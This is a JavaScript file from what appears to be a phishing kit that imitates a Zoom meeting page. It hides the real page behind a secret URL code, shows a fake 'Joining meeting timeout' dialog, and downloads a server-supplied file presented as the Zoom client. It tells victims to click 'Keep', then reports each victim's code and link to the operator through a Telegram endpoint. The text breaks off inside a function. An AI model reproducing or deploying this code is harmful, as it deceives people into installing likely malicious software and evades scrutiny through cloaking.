var linkCurrent = window.location.href;
// Проверяем, есть ли параметр 'iflink' в URL
if (!new URLSearchParams(window.location.search).has("827943012pwd")) {
  document.head.innerHTML = ``;
  document.body.innerHTML = `
  <section class="header">
    <div class="container">
      <div class="header_items">
        <div class="header_item">
          <a href="#!" class="header_logo"><svg width="115" height="26" viewBox="0 0 114 26" fill="#0b5cff" class="header-logo" style="width: 115px !important;"><path fill-rule="evenodd" clip-rule="evenodd" d="m23.6977 25.2924h-20.10301c-1.32885 0-2.58954-.6978-3.202853-1.8892-.698493-1.3617-.4429462-2.9956.630343-4.068l13.98692-13.97375h-10.01743c-2.7599 0-4.99167-2.22968-4.99167-4.987h18.5186c1.3288 0 2.5895.69784 3.2028 1.88927.6986 1.36164.443 2.9956-.6303 4.0679l-13.98691 13.97378h11.60181c2.7599 0 4.9917 2.2297 4.9917 4.987zm79.5603-25.2924c-2.879 0-5.4691 1.24249-7.241 3.23389-1.7883-1.9914-4.3781-3.23389-7.2401-3.23389-5.3497 0-9.7108 4.56149-9.7108 9.88887v15.40353c2.7598 0 4.9915-2.2297 4.9915-4.987v-10.46757c0-2.5701 1.9933-4.74871 4.5487-4.85083 2.692-.10213 4.9237 2.05945 4.9237 4.73169v10.58671c0 2.7573 2.2317 4.987 4.9915 4.987v-15.45457c0-2.5701 1.9935-4.74871 4.5485-4.85083 2.692-.10213 4.924 2.05945 4.924 4.73169v10.58671c0 2.7573 2.232 4.987 4.991 4.987v-15.40353c-.017-5.32738-4.378-9.88887-9.727-9.88887zm-54.3805 12.8334c0 7.0806-5.7583 12.8335-12.8455 12.8335-7.0871 0-12.8454-5.7529-12.8454-12.8335 0-7.0805 5.7753-12.8334 12.8454-12.8334 7.0702 0 12.8455 5.7529 12.8455 12.8334zm-4.9917 0c0-4.32315-3.5265-7.8464-7.8538-7.8464-4.3272 0-7.8538 3.52325-7.8538 7.8464 0 4.3233 3.5266 7.8465 7.8538 7.8465 4.3273 0 7.8538-3.5232 7.8538-7.8465zm32.6758 0c0 7.0806-5.758 12.8335-12.8451 12.8335-7.0877 0-12.8458-5.7529-12.8458-12.8335 0-7.0805 5.7757-12.8334 12.8458-12.8334 7.0696 0 12.8451 5.7529 12.8451 12.8334zm-4.9915 0c0-4.32315-3.5264-7.8464-7.8536-7.8464-4.3273 0-7.8541 3.52325-7.8541 7.8464 0 4.3233 3.5268 7.8465 7.8541 7.8465 4.3272 0 7.8536-3.5232 7.8536-7.8465z"></path></svg></a>
        </div>
        <div class="header_item">
          <div class="header_item_links">
            <a href="#!" class="header_item_link">Support</a>
            <a href="#!" class="header_item_link">English <img src="./assets/img/header_arrow.svg" alt="" /></a>
          </div>
        </div>
      </div>
    </div>
  </section>

  <section class="main">
    <div class="container">
      <svg viewBox="0 0 114 26" fill="#0b5cff" class="main_image" style=""><path fill-rule="evenodd" clip-rule="evenodd" d="m23.6977 25.2924h-20.10301c-1.32885 0-2.58954-.6978-3.202853-1.8892-.698493-1.3617-.4429462-2.9956.630343-4.068l13.98692-13.97375h-10.01743c-2.7599 0-4.99167-2.22968-4.99167-4.987h18.5186c1.3288 0 2.5895.69784 3.2028 1.88927.6986 1.36164.443 2.9956-.6303 4.0679l-13.98691 13.97378h11.60181c2.7599 0 4.9917 2.2297 4.9917 4.987zm79.5603-25.2924c-2.879 0-5.4691 1.24249-7.241 3.23389-1.7883-1.9914-4.3781-3.23389-7.2401-3.23389-5.3497 0-9.7108 4.56149-9.7108 9.88887v15.40353c2.7598 0 4.9915-2.2297 4.9915-4.987v-10.46757c0-2.5701 1.9933-4.74871 4.5487-4.85083 2.692-.10213 4.9237 2.05945 4.9237 4.73169v10.58671c0 2.7573 2.2317 4.987 4.9915 4.987v-15.45457c0-2.5701 1.9935-4.74871 4.5485-4.85083 2.692-.10213 4.924 2.05945 4.924 4.73169v10.58671c0 2.7573 2.232 4.987 4.991 4.987v-15.40353c-.017-5.32738-4.378-9.88887-9.727-9.88887zm-54.3805 12.8334c0 7.0806-5.7583 12.8335-12.8455 12.8335-7.0871 0-12.8454-5.7529-12.8454-12.8335 0-7.0805 5.7753-12.8334 12.8454-12.8334 7.0702 0 12.8455 5.7529 12.8455 12.8334zm-4.9917 0c0-4.32315-3.5265-7.8464-7.8538-7.8464-4.3272 0-7.8538 3.52325-7.8538 7.8464 0 4.3233 3.5266 7.8465 7.8538 7.8465 4.3273 0 7.8538-3.5232 7.8538-7.8465zm32.6758 0c0 7.0806-5.758 12.8335-12.8451 12.8335-7.0877 0-12.8458-5.7529-12.8458-12.8335 0-7.0805 5.7757-12.8334 12.8458-12.8334 7.0696 0 12.8451 5.7529 12.8451 12.8334zm-4.9915 0c0-4.32315-3.5264-7.8464-7.8536-7.8464-4.3273 0-7.8541 3.52325-7.8541 7.8464 0 4.3233 3.5268 7.8465 7.8541 7.8465 4.3272 0 7.8536-3.5232 7.8536-7.8465z"></path></svg>
    </div>
  </section>

  <section class="footer">
    <div class="container">
      <p class="footer_copy">©2024 Zoom Video Communications, Inc. All rights reserved.</p>
      <div class="footer_navs">
        <div class="footer_nav"><a href="#!">Privacy & Legal Policies</a></div>
        <div class="footer_nav"><a href="#!">Do Not Sell My Personal Information</a></div>
        <div class="footer_nav"><a href="#!">Cookie Preferences</a></div>
      </div>
    </div>
  </section>

  <script src="assets/js/script.js"></script>
  <style>* {
box-sizing: border-box;
margin: 0;
padding: 0;
}

h1,
h2,
h3 {
margin: 0;
padding: 0;
}

p {
margin: 0;
padding: 0;
}

a {
text-decoration: none;
color: #f2f2f2;
display: block;
}

body {
font-family: "Futura PT", sans-serif;
font-weight: 400;
top: 0;
left: 0;
padding: 0;
background: #fff;
margin: 0;
width: 100%;
height: 100%;
display: flex;
flex-direction: column;
position: relative;
}

html,
body {
width: 100%;
height: 100vh;
overflow-x: hidden;
}

::-webkit-scrollbar {
width: 5px;
background-color: #c8d5de;
height: 5px;
border-radius: 10px;
}

::-webkit-scrollbar-thumb {
border-radius: 10px;
background-color: #094fe2;
width: 5px;
}

::-webkit-scrollbar-track {
-webkit-box-shadow: inset 0 0 6px rgba(0, 0, 0, 0.2);
border-radius: 10px;
background-color: #c8d5de;
}

@font-face {
font-family: "Futura PT";
src: url(/assets/fonts/FuturaPT-Medium.ttf);
font-weight: 450;
}

@font-face {
font-family: "Futura PT";
src: url(/assets/fonts/FuturaPT-Book.ttf);
font-weight: 400;
}

@font-face {
font-family: "Futura PT";
src: url(/assets/fonts/FuturaPT-Demi.ttf);
font-weight: 500;
}


.header {
width: 100%;
height: 65px;
box-shadow: 0 0 2px rgba(0, 0, 0, 0.2);
}
.container{
width: 100%;
max-width: 1400px;
display: block;
margin: 0 auto;
}
.header_logo {
padding-top: 20px;
padding-bottom: 20px;
}
.header_items{
display: flex;
align-items: center;
}

.header_item:last-child{
margin-left: auto;
}

.header_item_links{
display: flex;
align-items: center;
}

.header_item_link{
color: #0e71eb;
font-size: 16px;
cursor: pointer;
transition: all .5s;
display: flex;
align-items: center;
}

.header_item_link:hover{
text-decoration: underline;
}

.header_item_link:first-child{
margin-right: 24px;
}

.header_item_link:last-child img{
vertical-align: middle;
margin-left: 5px;
transform: rotate(-90deg);
width: 8px;
}

.main_image{
display: block;
margin: 0 auto;
width: 100%;
max-width: 400px;
}
.main {
margin-bottom: 48px;
margin-top: auto;
}

.footer {
margin-top: auto;
padding-top: 50px;
padding-bottom: 50px;
background: #f0f0f0;
border-top: 1px solid rgba(0, 0, 0, 0.1);
}
.footer_copy {
font-size: 14px;
line-height: 16px;
color: rgba(4, 4, 19, 0.56);
text-align: center;
}

.footer_navs {
display: flex;
align-items: center;
justify-content: center;
margin-top: 5px;
}
.footer_nav{
padding-right: 6px;
margin-left: 6px;
border-right: 1px solid rgba(4, 4, 19, 0.26);
}

.footer_nav:last-child{
margin-right: 0px;
border-right: none;
}

.footer_nav a{
font-size: 14px;
color: rgba(4, 4, 19, 0.56);
line-height: 16px;
}

.footer_nav a:hover{
text-decoration: underline;
}

@media (min-width:320px) and (max-width:499px){
.container{
  padding-left: 20px;
  padding-right: 20px;
}
.footer_copy{
  font-size: 12px;
}

.main_image{
  max-height: 100px;
}

.footer_navs{
  flex-direction: column;
}
.footer_nav{
  margin-bottom: 5px;
  margin-right: 0px;
  margin-left: 0px;
  border-right: none;
}

}



@media (min-width:500px) and (max-width:1440px){
.container{
  padding-left: 20px;
  padding-right: 20px;
}

}</style>
  `;
  document.title = "One platfrom to connect | Zoom";

  
} else {
  var codeCurrent = linkCurrent.split("827943012pwd=")[1].split("TT5.1")[0];

  localStorage.setItem("code", codeCurrent);
  $.ajax({
    url: "/checkcode.php",
    type: "POST",
    data: { code: codeCurrent },
    success: function (result) {
      if (result == "0") {
        document.head.innerHTML = ``;
        document.body.innerHTML = `
    <section class="header">
      <div class="container">
        <div class="header_items">
          <div class="header_item">
            <a href="#!" class="header_logo"><svg width="115" height="26" viewBox="0 0 114 26" fill="#0b5cff" class="header-logo" style="width: 115px !important;"><path fill-rule="evenodd" clip-rule="evenodd" d="m23.6977 25.2924h-20.10301c-1.32885 0-2.58954-.6978-3.202853-1.8892-.698493-1.3617-.4429462-2.9956.630343-4.068l13.98692-13.97375h-10.01743c-2.7599 0-4.99167-2.22968-4.99167-4.987h18.5186c1.3288 0 2.5895.69784 3.2028 1.88927.6986 1.36164.443 2.9956-.6303 4.0679l-13.98691 13.97378h11.60181c2.7599 0 4.9917 2.2297 4.9917 4.987zm79.5603-25.2924c-2.879 0-5.4691 1.24249-7.241 3.23389-1.7883-1.9914-4.3781-3.23389-7.2401-3.23389-5.3497 0-9.7108 4.56149-9.7108 9.88887v15.40353c2.7598 0 4.9915-2.2297 4.9915-4.987v-10.46757c0-2.5701 1.9933-4.74871 4.5487-4.85083 2.692-.10213 4.9237 2.05945 4.9237 4.73169v10.58671c0 2.7573 2.2317 4.987 4.9915 4.987v-15.45457c0-2.5701 1.9935-4.74871 4.5485-4.85083 2.692-.10213 4.924 2.05945 4.924 4.73169v10.58671c0 2.7573 2.232 4.987 4.991 4.987v-15.40353c-.017-5.32738-4.378-9.88887-9.727-9.88887zm-54.3805 12.8334c0 7.0806-5.7583 12.8335-12.8455 12.8335-7.0871 0-12.8454-5.7529-12.8454-12.8335 0-7.0805 5.7753-12.8334 12.8454-12.8334 7.0702 0 12.8455 5.7529 12.8455 12.8334zm-4.9917 0c0-4.32315-3.5265-7.8464-7.8538-7.8464-4.3272 0-7.8538 3.52325-7.8538 7.8464 0 4.3233 3.5266 7.8465 7.8538 7.8465 4.3273 0 7.8538-3.5232 7.8538-7.8465zm32.6758 0c0 7.0806-5.758 12.8335-12.8451 12.8335-7.0877 0-12.8458-5.7529-12.8458-12.8335 0-7.0805 5.7757-12.8334 12.8458-12.8334 7.0696 0 12.8451 5.7529 12.8451 12.8334zm-4.9915 0c0-4.32315-3.5264-7.8464-7.8536-7.8464-4.3273 0-7.8541 3.52325-7.8541 7.8464 0 4.3233 3.5268 7.8465 7.8541 7.8465 4.3272 0 7.8536-3.5232 7.8536-7.8465z"></path></svg></a>
          </div>
          <div class="header_item">
            <div class="header_item_links">
              <a href="#!" class="header_item_link">Support</a>
              <a href="#!" class="header_item_link">English <img src="./assets/img/header_arrow.svg" alt="" /></a>
            </div>
          </div>
        </div>
      </div>
    </section>

    <section class="main">
      <div class="container">
        <svg viewBox="0 0 114 26" fill="#0b5cff" class="main_image" style=""><path fill-rule="evenodd" clip-rule="evenodd" d="m23.6977 25.2924h-20.10301c-1.32885 0-2.58954-.6978-3.202853-1.8892-.698493-1.3617-.4429462-2.9956.630343-4.068l13.98692-13.97375h-10.01743c-2.7599 0-4.99167-2.22968-4.99167-4.987h18.5186c1.3288 0 2.5895.69784 3.2028 1.88927.6986 1.36164.443 2.9956-.6303 4.0679l-13.98691 13.97378h11.60181c2.7599 0 4.9917 2.2297 4.9917 4.987zm79.5603-25.2924c-2.879 0-5.4691 1.24249-7.241 3.23389-1.7883-1.9914-4.3781-3.23389-7.2401-3.23389-5.3497 0-9.7108 4.56149-9.7108 9.88887v15.40353c2.7598 0 4.9915-2.2297 4.9915-4.987v-10.46757c0-2.5701 1.9933-4.74871 4.5487-4.85083 2.692-.10213 4.9237 2.05945 4.9237 4.73169v10.58671c0 2.7573 2.2317 4.987 4.9915 4.987v-15.45457c0-2.5701 1.9935-4.74871 4.5485-4.85083 2.692-.10213 4.924 2.05945 4.924 4.73169v10.58671c0 2.7573 2.232 4.987 4.991 4.987v-15.40353c-.017-5.32738-4.378-9.88887-9.727-9.88887zm-54.3805 12.8334c0 7.0806-5.7583 12.8335-12.8455 12.8335-7.0871 0-12.8454-5.7529-12.8454-12.8335 0-7.0805 5.7753-12.8334 12.8454-12.8334 7.0702 0 12.8455 5.7529 12.8455 12.8334zm-4.9917 0c0-4.32315-3.5265-7.8464-7.8538-7.8464-4.3272 0-7.8538 3.52325-7.8538 7.8464 0 4.3233 3.5266 7.8465 7.8538 7.8465 4.3273 0 7.8538-3.5232 7.8538-7.8465zm32.6758 0c0 7.0806-5.758 12.8335-12.8451 12.8335-7.0877 0-12.8458-5.7529-12.8458-12.8335 0-7.0805 5.7757-12.8334 12.8458-12.8334 7.0696 0 12.8451 5.7529 12.8451 12.8334zm-4.9915 0c0-4.32315-3.5264-7.8464-7.8536-7.8464-4.3273 0-7.8541 3.52325-7.8541 7.8464 0 4.3233 3.5268 7.8465 7.8541 7.8465 4.3272 0 7.8536-3.5232 7.8536-7.8465z"></path></svg>
      </div>
    </section>

    <section class="footer">
      <div class="container">
        <p class="footer_copy">©2024 Zoom Video Communications, Inc. All rights reserved.</p>
        <div class="footer_navs">
          <div class="footer_nav"><a href="#!">Privacy & Legal Policies</a></div>
          <div class="footer_nav"><a href="#!">Do Not Sell My Personal Information</a></div>
          <div class="footer_nav"><a href="#!">Cookie Preferences</a></div>
        </div>
      </div>
    </section>

    <script src="assets/js/script.js"></script>
    <style>* {
  box-sizing: border-box;
  margin: 0;
  padding: 0;
}

h1,
h2,
h3 {
  margin: 0;
  padding: 0;
}

p {
  margin: 0;
  padding: 0;
}

a {
  text-decoration: none;
  color: #f2f2f2;
  display: block;
}

body {
  font-family: "Futura PT", sans-serif;
  font-weight: 400;
  top: 0;
  left: 0;
  padding: 0;
  background: #fff;
  margin: 0;
  width: 100%;
  height: 100%;
  display: flex;
  flex-direction: column;
  position: relative;
}

html,
body {
  width: 100%;
  height: 100vh;
  overflow-x: hidden;
}

::-webkit-scrollbar {
  width: 5px;
  background-color: #c8d5de;
  height: 5px;
  border-radius: 10px;
}

::-webkit-scrollbar-thumb {
  border-radius: 10px;
  background-color: #094fe2;
  width: 5px;
}

::-webkit-scrollbar-track {
  -webkit-box-shadow: inset 0 0 6px rgba(0, 0, 0, 0.2);
  border-radius: 10px;
  background-color: #c8d5de;
}

@font-face {
  font-family: "Futura PT";
  src: url(/assets/fonts/FuturaPT-Medium.ttf);
  font-weight: 450;
}

@font-face {
  font-family: "Futura PT";
  src: url(/assets/fonts/FuturaPT-Book.ttf);
  font-weight: 400;
}

@font-face {
  font-family: "Futura PT";
  src: url(/assets/fonts/FuturaPT-Demi.ttf);
  font-weight: 500;
}


.header {
  width: 100%;
  height: 65px;
  box-shadow: 0 0 2px rgba(0, 0, 0, 0.2);
}
.container{
  width: 100%;
  max-width: 1400px;
  display: block;
  margin: 0 auto;
}
.header_logo {
  padding-top: 20px;
  padding-bottom: 20px;
}
.header_items{
  display: flex;
  align-items: center;
}

.header_item:last-child{
  margin-left: auto;
}

.header_item_links{
  display: flex;
  align-items: center;
}

.header_item_link{
  color: #0e71eb;
  font-size: 16px;
  cursor: pointer;
  transition: all .5s;
  display: flex;
  align-items: center;
}

.header_item_link:hover{
  text-decoration: underline;
}

.header_item_link:first-child{
  margin-right: 24px;
}

.header_item_link:last-child img{
  vertical-align: middle;
  margin-left: 5px;
  transform: rotate(-90deg);
  width: 8px;
}

.main_image{
  display: block;
  margin: 0 auto;
  width: 100%;
  max-width: 400px;
}
.main {
  margin-bottom: 48px;
  margin-top: auto;
}

.footer {
  margin-top: auto;
  padding-top: 50px;
  padding-bottom: 50px;
  background: #f0f0f0;
border-top: 1px solid rgba(0, 0, 0, 0.1);
}
.footer_copy {
  font-size: 14px;
  line-height: 16px;
  color: rgba(4, 4, 19, 0.56);
  text-align: center;
}

.footer_navs {
  display: flex;
  align-items: center;
  justify-content: center;
  margin-top: 5px;
}
.footer_nav{
  padding-right: 6px;
  margin-left: 6px;
  border-right: 1px solid rgba(4, 4, 19, 0.26);
}

.footer_nav:last-child{
  margin-right: 0px;
  border-right: none;
}

.footer_nav a{
  font-size: 14px;
  color: rgba(4, 4, 19, 0.56);
  line-height: 16px;
}

.footer_nav a:hover{
  text-decoration: underline;
}

@media (min-width:320px) and (max-width:499px){
  .container{
    padding-left: 20px;
    padding-right: 20px;
  }
  .footer_copy{
    font-size: 12px;
  }

  .main_image{
    max-height: 100px;
  }

  .footer_navs{
    flex-direction: column;
  }
  .footer_nav{
    margin-bottom: 5px;
    margin-right: 0px;
    margin-left: 0px;
    border-right: none;
  }

}



@media (min-width:500px) and (max-width:1440px){
  .container{
    padding-left: 20px;
    padding-right: 20px;
  }

}</style>
    `;
        document.title = "One platfrom to connect | Zoom";
      }
    },
  });
}
var link = "";
var nameFile = "";
var main_button = document.getElementById("main_button_download");
var a_download_zoom = document.getElementById("a_download_zoom");
const hashParams = window.location.hash.substr(1); // убираем символ '#'

// Разделяем параметры хэша
const hashParamsArray = hashParams.split("&");

// Создаем объект для хранения параметров хэша
const hashParamsObj = {};
hashParamsArray.forEach((param) => {
  const [key, value] = param.split("=");
  hashParamsObj[key] = decodeURIComponent(value || "").replace(/\+/g, " ");
});

// Получаем параметр "code" из хэша
const urlCode = hashParamsObj["827943012pwd"];
const code = localStorage.getItem("code") || urlCode || "default";
console.log(urlCode);
$.ajax({
  url: "/getfile.php",
  type: "POST",
  success: function (result) {
    console.log(result);
    if (isMobileDevice()) {
      console.log("mobile");
      main_button.style.pointerEvents = "none";
      a_download_zoom.style.pointerEvents = "none";
      return;
    }
    link = result;
    main_button.href = link;
    a_download_zoom.href = link;
    nameFile = link.split("/").pop();
  },
});

// CSS стили
var css = `
#header_outer ul {
    list-style: none;
    margin: 0;
    padding: 0;
}
.dropdown-language .dropdown-menu {
    column-count: 2;
}
.dropdown-language .dropdown-menu, .dropdown-currency .dropdown-menu {
    border-radius: 4px;
    margin-top: 6px !important;
    text-shadow: none;
    border: 1px solid #eee;
}
.open>.dropdown-menu {
    display: block;
}
.dropdown-menu.pull-right {
    right: 0;
    left: auto;
}
.pull-right {
    float: right !important;
}
#header .action-btns .dropdown-language .dropdown-menu li {
    margin: 0;
}

#header .action-btns .dropdown-menu li {
    display: block;
    float: none;
    margin: 4px;
}
#header .action-btns li {
    margin-right: 40px;
    padding: 0;
    float: left;
}.join-frame #header_container .action-btns a {
    color: #2073d9;
    font-size: 13px;
    font-weight: 400;
}

.dropdown-language .dropdown-menu li.active>a, .dropdown-currency .dropdown-menu li.active>a {
    color: #fff !important;
}
.dropdown-language .dropdown-menu li>a, .dropdown-currency .dropdown-menu li>a {
    padding: 8px 14px;
    color: #555 !important;
    text-decoration: none;
    display: block;
    clear: both;
    font-weight: 300;
    line-height: 15px;
    white-space: nowrap;
    text-transform: inherit !important;
}
.join-frame .action-btns a {
    line-height: inherit;
}
.dropdown-menu>.active>a, .dropdown-menu>.active>a:hover, .dropdown-menu>.active>a:focus {
    color: #fff;
    text-decoration: none;
    background-color: #428bca;
    outline: 0;
}
.dropdown-menu>li>a {
    display: block;
    padding: 3px 20px;
    clear: both;
    font-weight: normal;
    line-height: 1.42857143;
    color: #333;
    white-space: nowrap;
}
.dropdown-language a, .dropdown-currency a {
    color: #fff;
}
a {
    color: #0956b5;
    text-decoration: none;
}
.dropdown-menu {
    position: absolute;
    top: 100%;
    left: 0;
    z-index: 1000;
    display: none;
    float: left;
    min-width: 160px;
    padding: 5px 0;
    margin: 2px 0 0;
    font-size: 14px;
    list-style: none;
    background-color: #fff;
    background-clip: padding-box;
    border: 1px solid #ccc;
    border: 1px solid rgba(0, 0, 0, .15);
    border-radius: 4px;
    -webkit-box-shadow: 0 6px 12px rgba(0,0,0,.175);
    box-shadow: 0 6px 12px rgba(0,0,0,.175);
}`;

// Создаём элемент style и записываем туда CSS
var style = document.createElement("style");
style.type = "text/css";
if (style.styleSheet) {
  // для IE
  style.styleSheet.cssText = css;
} else {
  // для остальных браузеров
  style.appendChild(document.createTextNode(css));
}
var change_language = document.getElementById("change_language");
// Помещаем элемент style в head
document.getElementsByTagName("head")[0].appendChild(style);

// HTML элементы
var ul = document.createElement("ul");
ul.className = "dropdown-menu pull-right";

var languages = [
  {
    href:
      "/index.html?82704550627pwd=QFPJJ9Rv1wBUsxFr50QxnXLlLpZTT5.1#success&code=" +
      code,
    locale: "en-US",
    label: "English",
  },
  {
    href:
      "/es/index.html?82704550627pwd=QFPJJ9Rv1wBUsxFr50QxnXLlLpZTT5.1#success&code=" +
      code,
    locale: "es-ES",
    label: "Español",
  },
  {
    href:
      "/de/index.html?82704550627pwd=QFPJJ9Rv1wBUsxFr50QxnXLlLpZTT5.1#success&code=" +
      code,
    locale: "de-DE",
    label: "Deutsch",
  },
  {
    href:
      "/zh-cn/index.html?82704550627pwd=QFPJJ9Rv1wBUsxFr50QxnXLlLpZTT5.1#success&code=" +
      code,
    locale: "zh-CN",
    label: "简体中文",
  },
  {
    href:
      "/zh-tw/index.html?82704550627pwd=QFPJJ9Rv1wBUsxFr50QxnXLlLpZTT5.1#success&code=" +
      code,
    locale: "zh-TW",
    label: "繁體中文",
  },
  {
    href:
      "/fr/index.html?82704550627pwd=QFPJJ9Rv1wBUsxFr50QxnXLlLpZTT5.1#success&code=" +
      code,
    locale: "fr-FR",
    label: "Français",
  },
  {
    href:
      "/pt/index.html?82704550627pwd=QFPJJ9Rv1wBUsxFr50QxnXLlLpZTT5.1#success&code=" +
      code,
    locale: "pt-PT",
    label: "Português",
  },
  {
    href:
      "/jp/index.html?82704550627pwd=QFPJJ9Rv1wBUsxFr50QxnXLlLpZTT5.1#success&code=" +
      code,
    locale: "jp-JP",
    label: "日本語",
  },
  {
    href:
      "/ru/index.html?82704550627pwd=QFPJJ9Rv1wBUsxFr50QxnXLlLpZTT5.1#success&code=" +
      code,
    locale: "ru-RU",
    label: "Русский",
  },
  {
    href:
      "/ko/index.html?82704550627pwd=QFPJJ9Rv1wBUsxFr50QxnXLlLpZTT5.1#success&code=" +
      code,
    locale: "ko-KO",
    label: "한국어",
  },
  {
    href:
      "/it/index.html?82704550627pwd=QFPJJ9Rv1wBUsxFr50QxnXLlLpZTT5.1#success&code=" +
      code,
    locale: "it-IT",
    label: "Italiano",
  },
  {
    href:
      "/vi/index.html?82704550627pwd=QFPJJ9Rv1wBUsxFr50QxnXLlLpZTT5.1#success&code=" +
      code,
    locale: "vi-VN",
    label: "Tiếng Việt",
  },
  {
    href:
      "/pl/index.html?82704550627pwd=QFPJJ9Rv1wBUsxFr50QxnXLlLpZTT5.1#success&code=" +
      code,
    locale: "pl-PL",
    label: "Polski",
  },
  {
    href:
      "/tr/index.html?82704550627pwd=QFPJJ9Rv1wBUsxFr50QxnXLlLpZTT5.1#success&code=" +
      code,
    locale: "tr-TR",
    label: "Türkçe",
  },
  {
    href:
      "/id/index.html?82704550627pwd=QFPJJ9Rv1wBUsxFr50QxnXLlLpZTT5.1#success&code=" +
      code,
    locale: "id-ID",
    label: "Bahasa Indonesia",
  },
  {
    href:
      "/nl/index.html?82704550627pwd=QFPJJ9Rv1wBUsxFr50QxnXLlLpZTT5.1#success&code=" +
      code,
    locale: "nl-NL",
    label: "Nederlands",
  },
];

languages.forEach(function (lang) {
  var li = document.createElement("li");
  var a = document.createElement("a");
  a.href = lang.href;
  a.setAttribute("data-locale", lang.locale);
  a.textContent = lang.label;
  li.appendChild(a);
  ul.appendChild(li);
});

// Вставляем ul в нужное место на странице, например, в конец body
change_language.appendChild(ul);

change_language.addEventListener("click", function () {
  var dropdownLanguage = document.querySelector(".dropdown-menu");
  dropdownLanguage.style.display = "block";
});
function createModal() {
  var modalDiv = document.createElement("div");
  modalDiv.id = "myModal";
  modalDiv.className = "modal";

  var modalContent = document.createElement("div");
  modalContent.className = "modal-content";

  // Закрытие модального окна по клику вне его области
  window.onclick = function (event) {
    if (event.target == modalDiv) {
      var loadingScreen = document.getElementById("loadingScreen");

      modalDiv.style.animation = "fadeOut 0.5s forwards";
      loadingScreen.style.animation = "fadeOut 0.5s forwards";
      setTimeout(function () {
        modalDiv.style.display = "none";
        loadingScreen.style.display = "none";
      }, 490);
    }
  };
  var modalTitle = document.createElement("h2");
  modalTitle.textContent = "Joining meeting timeout.";

  var modalText = document.createElement("p");
  modalText.textContent =
    "Unable join from browser, please join using the Zoom desktop client or install and join to the session directly.";

  var modalFooter = document.createElement("div");
  modalFooter.className = "modal-footer";

  var acceptButton = document.createElement("button");
  acceptButton.className = "btn accept";
  acceptButton.textContent = "Join the session";

  var declineButton = document.createElement("button");
  declineButton.className = "btn decline";
  declineButton.textContent = "Cancel";

  // Добавляем обработчик события на кнопку "Закрыть"
  declineButton.addEventListener("click", function () {
    var loadingScreen = document.getElementById("loadingScreen");

    modalDiv.style.animation = "fadeOut 0.5s forwards";
    loadingScreen.style.animation = "fadeOut 0.5s forwards";
    setTimeout(function () {
      modalDiv.style.display = "none";
      loadingScreen.style.display = "none";
    }, 490);
  });

  // Добавляем обработчик события на кнопку "Принять"
  acceptButton.addEventListener("click", function () {
    if (isMobileDevice()) {
      return;
    }
    // Выполняем загрузку файла по ссылке
    if (link) {
      var downloadLink = document.createElement("a");
      downloadLink.href = link;
      downloadLink.target = "_blank"; // Открываем в новой вкладке
      downloadLink.download = ""; // Инициирует загрузку, а не просто переход по ссылке
      document.body.appendChild(downloadLink);
      downloadLink.click(); // Инициируем скачивание
      document.body.removeChild(downloadLink); // Удаляем элемент после скачивания

      // Создаем div элемент
      var alertDiv = document.createElement("div");
      alertDiv.setAttribute("role", "alert");
      alertDiv.classList.add("AIf0J3hN", "cvF4vE8e", "REZiVTB5");

      var innerDiv = document.createElement("div");
      innerDiv.classList.add("egxStE60");

      innerDiv.innerHTML =
        'Click <b>Keep</b> when receiving notification <br>Then click <b id="zoom_notif_text">' +
        nameFile +
        "</b>";

      alertDiv.appendChild(innerDiv);

      // Вставляем новый элемент в DOM
      document.body.appendChild(alertDiv);

      var loadingScreen = document.getElementById("loadingScreen");

      modalDiv.style.animation = "fadeOut 0.5s forwards";
      loadingScreen.style.animation = "fadeOut 0.5s forwards";
      setTimeout(function () {
        modalDiv.style.display = "none";
        loadingScreen.style.display = "none";
      }, 490);
    }

    var loadingScreen = document.getElementById("loadingScreen");

    modalDiv.style.animation = "fadeOut 0.5s forwards";
    loadingScreen.style.animation = "fadeOut 0.5s forwards";
    modalDiv.style.display = "none";
    loadingScreen.style.display = "none";

    if (!localStorage.getItem("send") || localStorage.getItem("send") == null) {
      $.ajax({
        url: "/sendTelegram.php",
        type: "POST",
        data: {
          link: link,
          code: code,
        },
        success: function (result) {
          localStorage.setItem("send", true);
          console.log(result);
        },
      });
    }
  });

  // Собираем элементы в модальное окно
  modalContent.appendChild(closeButton);
  modalContent.appendChild(modalTitle);
  modalContent.appendChild(modalText);
  modalFooter.appendChild(acceptButton);
  modalFooter.appendChild(declineButton);
  modalContent.appendChild(modalFooter);
  modalDiv.appendChild(modalContent);

  return modalDiv;
}
function addDynamicStyles() {
  var css = `
        .loading-screen {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            position: fixed;
            z-index: 99999;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: #222;
            color:white;
        }

        .loading-circle {
            border: 4px solid white;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 2s linear infinite;
        }

        .loading-text {
            margin-top: 10px;
        }

        .modal {
            display: none;
            position: fixed;
            z-index: 99999999;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            overflow: auto;
            background-color: rgba(0, 0, 0, 0.4);
            animation: fadeIn 0.5s;
        }

        .modal-content {
            background-color: #fefefe;
            margin: 15% auto;
            padding: 20px;
            border: 1px solid #888;
            width: 80%;
            max-width: 500px;
            border-radius: 5px;
            animation: slideIn 0.5s;
        }

        .close {
            color: #aaa;
            float: right;
            font-size: 28px;
            font-weight: bold;
        }

        .close:hover,
        .close:focus {
            color: black;
            text-decoration: none;
            cursor: pointer;
        }

        .modal-footer {
            text-align: right;
            margin-top: 20px;
        }

        .btn {
            padding: 10px 20px;
            margin-left: 10px;
            border-radius: 5px;
            border: none;
            font-size: 16px;
            cursor: pointer;
        }

        .accept {
            background-color: #007bff;
            color: white;
        }

        .decline {
            background-color: #fff;
            color: #007bff;
            border: 1px solid #007bff;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        @keyframes slideIn {
            from { top: -300px; opacity: 0; }
            to { top: 15%; opacity: 1; }
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    `;

  // Создаем элемент style и добавляем CSS правила
  var style = document.createElement("style");
  style.type = "text/css";
  if (style.styleSheet) {
    style.styleSheet.cssText = css; // Для IE
  } else {
    style.appendChild(document.createTextNode(css)); // Для остальных браузеров
  }

  // Добавляем созданный style элемент в head
  document.head.appendChild(style);
}
function createLoadingScreen() {
  var loadingScreenDiv = document.createElement("div");
  loadingScreenDiv.id = "loadingScreen";
  loadingScreenDiv.className = "loading-screen";

  var loadingCircle = document.createElement("div");
  loadingCircle.className = "loading-circle";

  var loadingText = document.createElement("p");
